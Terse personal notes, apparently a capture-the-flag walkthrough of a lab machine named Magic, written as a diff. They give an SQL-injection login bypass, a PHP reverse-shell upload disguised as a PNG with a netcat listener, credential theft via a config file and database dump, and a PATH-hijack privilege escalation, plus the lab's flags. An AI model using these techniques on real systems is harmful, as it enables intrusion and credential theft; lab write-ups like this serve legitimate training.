@@ -1,0 +1,85 @@
+nmap -sC -sV -oN nmap 10.10.10.185 -v -A
+
+port 80 = website
+
+/login.php
+
+sql injection
+' or ''='
+' or ''='
+
+-> success
+
+upload file -> upload reverse shell
+cp image.png -> burp upload
+cp reverse shell -> change ip:port
+in burp upload del until fail -> reverse shell at the end
+application/x-php and name it php-reverse-shell.php.png
+
+visit /images/uploads/php-reverse-shell.php.png
+nc -lvnp 4444
+
+-> shell as www-data
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+user is theseus
+
+/var/www/Magic -> db.php5
+```
+...
+    private static $dbName = 'Magic' ;
+    private static $dbHost = 'localhost' ;
+    private static $dbUsername = 'theseus';
+    private static $dbUserPassword = 'iamkingtheseus';
+...
+```
+
+ssh theseus@10.10.10.185 -> theseus@10.10.10.185: Permission denied (publickey).
+and su theseus doesnt work with password -> rabbit hole
+
+lets dump sql db
+mysqldump -piamkingtheseus -utheseus Magic
+
+```
+...
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+...
+```
+
+su theseus with Th3s3usW4sK1ng -> we are theseus
+
+we get user flag
+ee364b71e33c0c2c5abbeab350af2dba
+
+cant sudo
+find / -perm -u=s -type f 2>/dev/null
+
+-> sysinfo
+prints infos on system
+
+lets check if it calls other function without /bin/
+cd /tmp
+ltrace -o test sysinfo
+cat test | grep system -> nothing
+cat test | grep popen:
+
+popen("lshw -short", "r")                        = 0x559106a36280
+popen("fdisk -l", "r")                           = 0x559106a36280
+popen("cat /proc/cpuinfo", "r")                  = 0x559106a36280
+popen("free -h", "r")                            = 0x559106a36280
+
+lets try privilege escalation using path and cat:
+no vim
+
+echo "/bin/sh" > cat
+chmod +x cat
+export PATH=/tmp:${PATH}
+
+sysinfo
+first try -> id -> cant see
+when i exit it appears so i do it again using less cuz cat opens shell
+
+root flag
+2724c7376307dfa9bc5d43579c5dea07
+
+
